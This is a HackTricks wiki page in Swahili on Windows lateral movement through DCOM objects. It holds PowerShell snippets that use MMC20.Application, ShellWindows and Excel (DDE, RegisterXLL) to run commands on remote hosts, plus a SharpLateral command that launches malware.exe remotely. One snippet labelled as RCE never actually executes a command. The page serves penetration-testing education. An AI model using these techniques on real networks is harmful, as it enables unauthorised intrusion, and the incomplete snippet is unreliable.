# DCOM Exec

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikionekana kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

**Kikundi cha Usalama cha Try Hard**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## MMC20.Application

**Kwa habari zaidi kuhusu mbinu hii angalia chapisho la asili kutoka [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**


Modeli ya Vitu vya Mfano wa Vitengo vilivyosambazwa (DCOM) inatoa uwezo wa kuvutia kwa mwingiliano wa mtandao na vitu. Microsoft hutoa nyaraka kamili kwa DCOM na Modeli ya Vitengo vya Mfano (COM), inayopatikana [hapa kwa DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) na [hapa kwa COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Orodha ya programu za DCOM inaweza kupatikana kwa kutumia amri ya PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), inawezesha uandishi wa hatua za MMC snap-in kwa kutumia script. Kwa umuhimu, hii object ina `ExecuteShellCommand` method chini ya `Document.ActiveView`. Taarifa zaidi kuhusu method hii zinapatikana [hapa](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Angalia ikifanya kazi:

Hii kipengele inarahisisha utekelezaji wa amri kupitia mtandao kupitia programu ya DCOM. Ili kuingiliana na DCOM kijijini kama admin, PowerShell inaweza kutumika kama ifuatavyo:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Amri ifuatayo inaunganisha kwenye programu ya DCOM na kurudi kwa kipengele cha COM. Mbinu ya ExecuteShellCommand inaweza kisha kuitwa kutekeleza mchakato kwenye mwenyeji wa mbali. Mchakato unajumuisha hatua zifuatazo:

Angalia mbinu:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Pata RCE:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Kwa habari zaidi kuhusu hii mbinu angalia chapisho la asili [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Kitu cha **MMC20.Application** kiligunduliwa kukosa "LaunchPermissions" wazi, kikiruhusu upatikanaji wa Wasimamizi kwa chaguo-msingi. Kwa maelezo zaidi, mjadala unaweza kuchunguzwa [hapa](https://twitter.com/tiraniddo/status/817532039771525120), na matumizi ya [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET kwa kuchuja vitu bila ruhusa wazi ya Kuzindua inapendekezwa.

Vitu viwili maalum, `ShellBrowserWindow` na `ShellWindows`, vilionyeshwa kutokana na kukosa kwa Ruhusa wazi ya Kuzindua. Kutokuwepo kwa kuingia kwa usajili wa `LaunchPermission` chini ya `HKCR:\AppID\{guid}` inaashiria kukosekana kwa ruhusa wazi.

###  ShellWindows
Kwa `ShellWindows`, ambayo haina ProgID, njia za .NET `Type.GetTypeFromCLSID` na `Activator.CreateInstance` hurahisisha kuunda vitu kwa kutumia AppID yake. Mchakato huu unatumia OleView .NET kupata CLSID kwa `ShellWindows`. Mara baada ya kuundwa, mwingiliano unawezekana kupitia njia ya `WindowsShell.Item`, ikiongoza kwa wito wa njia kama `Document.Application.ShellExecute`.

Amri za PowerShell za mfano zilitolewa kuunda kipengee na kutekeleza amri kijijini:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Harakati za Upande kwa Vitu vya Excel DCOM

Harakati za upande zinaweza kufikiwa kwa kuchexploit vitu vya DCOM vya Excel. Kwa maelezo zaidi, ni vyema kusoma mjadala kuhusu kutumia Excel DDE kwa harakati za upande kupitia DCOM kwenye [blogi ya Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Mradi wa Empire hutoa script ya PowerShell, ambayo inaonyesha matumizi ya Excel kwa utekelezaji wa kanuni za mbali (RCE) kwa kubadilisha vitu vya DCOM. Hapa chini ni vipande kutoka kwenye script inayopatikana kwenye [repo ya GitHub ya Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), ikionyesha njia tofauti za kutumia Excel kwa RCE:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Zana za Kiotomatiki kwa Harakati za Upande

Zana mbili zinaonyeshwa kwa kiotomatiki hizi mbinu:

- **Invoke-DCOM.ps1**: Skripti ya PowerShell iliyotolewa na mradi wa Empire ambayo inasaidia kuita njia tofauti za kutekeleza nambari kwenye mashine za mbali. Skripti hii inapatikana kwenye hazina ya GitHub ya Empire.

- **SharpLateral**: Zana iliyoundwa kwa ajili ya kutekeleza nambari kijijini, ambayo inaweza kutumika na amri:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Vifaa vya Kiotomatiki

* Skripti ya Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) inaruhusu kwa urahisi kuita njia zote zilizopendekezwa za kutekeleza nambari kwenye mashine zingine.
* Unaweza pia kutumia [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Marejeo

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

**Kikundi cha Usalama cha Try Hard**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
